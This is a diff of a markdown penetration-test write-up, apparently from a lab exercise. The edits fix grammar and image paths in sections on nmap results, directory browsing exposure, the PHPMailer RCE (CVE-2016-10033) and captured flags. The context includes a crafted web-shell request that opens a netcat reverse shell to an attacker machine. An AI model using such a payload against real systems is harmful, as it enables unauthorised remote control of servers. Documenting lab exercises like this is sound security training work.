@@ -12,22 +12,22 @@
 
 ## Exposed Services
 
-Nmap scan results reveals the below services and OS details:
+Nmap scan results reveal the below services and OS details:
 
 nmap -sV 192.168.1.115
 
-![1](/Images/4/1.PNG)
+![1](/Resources/Images/4/1.PNG)
 
 ---
 
 ## Critical Vulnerabilities
 
-The CVE and CWE databases give us information of vulnerabilities found in the previous step. These vulnerabilities are potential points of entry:
+The CVE and CWE databases give us information on the vulnerabilities found in the previous step. These vulnerabilities are potential points of entry
 
 Vulnerability | Description | Impact
 ---|---|---
-**CWE-548** Exposure of information through directory browsing | A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers | Allowing an bad actor to obtain more information about your server could allow them to further their attack
-**CVE-2016-10033** Remote Code Execution Vulnerability in PHPMailer | HPMailer allows extra parameters in the mail command and consequently executes arbitrary code | An attacker can execute commands on the web server remotely  allowing them to further compromise the target.
+**CWE-548** Exposure of information through directory browsing | A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers | Allowing a bad actor to obtain more information about your server could allow them to further their attack
+**CVE-2016-10033** Remote Code Execution Vulnerability in PHPMailer | HPMailer allows extra parameters in the mail command and consequently executes arbitrary code | An attacker can execute commands on the web server remotely allowing them to further compromise the target.
 
 ---
 
@@ -47,7 +47,7 @@ The Red Team was able to penetrate Target 2 and retrieve the following confident
 
     **Vendor Directory Index view from the browser** | PATH File: **Flag1** | **PHPMAILER version**
      ---|---|---
-    ![1](/Images/4/6.PNG) | ![2](/Images/4/7.PNG) | ![4](/Images/4/9.PNG)    
+    ![6](/Resources/Images/4/6.PNG) | ![7](/Resources/Images/4/7.PNG) | ![9](/Resources/Images/4/9.PNG)    
 
 ---
 
@@ -67,14 +67,14 @@ The Red Team was able to penetrate Target 2 and retrieve the following confident
 
         **Crafted payload:** `192.168.1.115/backdoor.php?cmd=nc 192.168.1.101 4444 -e /bin/bash`
 
-        ![17](/Images/4/17.PNG)
+        ![17](/Resources/Images/4/17.PNG)
 
-        **Sensitive information was found in the "www" and "WordPress uploads" directory**    
+        **Sensitive information has been found in the "www" and "WordPress uploads" directory**    
 
         **flag2**
 
-        ![19](/Images/4/19.PNG)
+        ![19](/Resources/Images/4/19.PNG)
 
         **flag3**
 
-        ![20](/Images/4/20.png)
+        ![20](/Resources/Images/4/20.png)
